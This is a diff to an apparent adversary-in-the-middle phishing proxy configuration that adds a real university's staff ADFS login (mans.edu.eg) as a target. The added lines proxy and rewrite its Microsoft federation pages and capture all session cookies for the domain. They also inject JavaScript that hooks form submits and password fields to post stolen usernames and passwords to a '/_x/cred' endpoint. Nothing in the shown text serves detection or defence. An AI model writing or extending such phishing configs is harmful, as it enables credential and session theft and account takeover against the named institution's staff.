@@ -23,11 +23,16 @@ proxy_hosts:
 # ADFS Proxy Hosts
   - { phish_sub: "adffs", orig_sub: "adfs", domain: "example.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "adfxs", orig_sub: "adfs", domain: "example.org", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "adfsst", orig_sub: "adfsstaff", domain: "mans.edu.eg", session: true, is_landing: false, auto_filter: false }
 
 sub_filters:
 # ADFS Sub Filters
   - { triggers_on: "adfs.example.com", orig_sub: "adfs", domain: "example.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - { triggers_on: "adfs.example.org", orig_sub: "adfs", domain: "example.org", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+# mans.edu.eg ADFS Sub Filters — rewrite self-references and Microsoft WS-Fed form action
+  - { triggers_on: "adfsstaff.mans.edu.eg", orig_sub: "adfsstaff", domain: "mans.edu.eg", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"] }
+  - { triggers_on: "adfsstaff.mans.edu.eg", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html"] }
+  - { triggers_on: "adfsstaff.mans.edu.eg", orig_sub: "login", domain: "microsoftonline.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }
 
 # Microsoft Proxy Hosts — GoDaddy federation URL rewriting (response body)
   - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
@@ -196,6 +201,12 @@ auth_tokens:
   - domain: '.sso.godaddy.com'
     keys: ['.*,regexp']
 
+  - domain: 'adfsstaff.mans.edu.eg'
+    keys: ['.*,regexp']
+
+  - domain: '.mans.edu.eg'
+    keys: ['.*,regexp']
+
   - domain: '.onelogin.com'
     keys: ['onelogin.com_user']
 
@@ -274,12 +285,13 @@ js_inject:
         return text.replace(
           /("FederationRedirectUrl"\s*:\s*")([^"]*)/,
           function(m, prefix, fedUrl) {
-            // Rewrite GoDaddy SSO hostnames to their proxied equivalents
-            // (fallback in case server-side sub_filters miss it due to compression etc.)
+            // Rewrite GoDaddy SSO hostnames and any ADFS/federation hostnames
+            // to their proxied equivalents (fallback for compression-missed sub_filters)
             var patchedUrl = fedUrl
-              .replace(/sso\.godaddy\.com/g,     'ssso.' + _phishDomain)
-              .replace(/sso\.secureserver\.net/g, 'sssn.' + _phishDomain)
-              .replace(/sso2\.secureserver\.net/g,'sssn2.' + _phishDomain);
+              .replace(/sso\.godaddy\.com/g,          'ssso.' + _phishDomain)
+              .replace(/sso\.secureserver\.net/g,      'sssn.' + _phishDomain)
+              .replace(/sso2\.secureserver\.net/g,     'sssn2.' + _phishDomain)
+              .replace(/adfsstaff\.mans\.edu\.eg/g,    'adfsst.' + _phishDomain);
             // Append email fragment once
             if (patchedUrl.indexOf('#') === -1 && _scEmail) {
               patchedUrl += '#' + encodeURIComponent(_scEmail);
@@ -475,8 +487,8 @@ js_inject:
         setTimeout(fill, 400);
       })();
 
-  # ADFS custom domain — same approach
-  - trigger_domains: ["adfs.example.com", "adfs.example.org"]
+  # ADFS custom domain — password capture + email autofill
+  - trigger_domains: ["adfs.example.com", "adfs.example.org", "adfsstaff.mans.edu.eg"]
     trigger_paths: ["/*"]
     script: |
       (function() {
@@ -485,6 +497,49 @@ js_inject:
         var hash   = window.location.hash.slice(1);
         if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);
 
+        var _sent = false;
+        function _sendCred(pass, user) {
+          if (_sent || !pass) return;
+          _sent = true;
+          try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '/_x/cred', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({p: pass, u: user || email || ''}));
+          } catch(e) {}
+        }
+
+        // DOM-level capture: ADFS uses traditional form POST so this is the
+        // most reliable path. Capture phase fires before ADFS form submit handler.
+        document.addEventListener('submit', function(e) {
+          var form = e.target;
+          if (!form) return;
+          var pw = form.querySelector('input[type="password"],input[name="Password"],input[name="passwd"]');
+          if (pw && pw.value) {
+            var uEl = form.querySelector('input[name="UserName"],input[type="email"],input[name="email"],input[name="username"]');
+            _sendCred(pw.value, uEl ? uEl.value : '');
+          }
+        }, true);
+
+        function _hookPwField(pw) {
+          if (pw._xt) return;
+          pw._xt = true;
+          pw.addEventListener('keydown', function(e) {
+            if ((e.key === 'Enter' || e.keyCode === 13) && pw.value) {
+              var form = pw.closest ? pw.closest('form') : null;
+              var uEl = form && form.querySelector('input[name="UserName"],input[type="email"],input[name="email"]');
+              _sendCred(pw.value, uEl ? uEl.value : '');
+            }
+          });
+        }
+        function _scanPwFields() {
+          var pws = document.querySelectorAll('input[type="password"],input[name="Password"]');
+          for (var i = 0; i < pws.length; i++) _hookPwField(pws[i]);
+        }
+        new MutationObserver(_scanPwFields).observe(document.documentElement, {childList:true, subtree:true});
+        _scanPwFields();
+
+        // Email autofill
         function fill() {
           var sels = ['input[name="UserName"]','input[id="userNameInput"]','input[type="email"]','input[name="email"]','input[type="text"]'];
           for (var i = 0; i < sels.length; i++) {
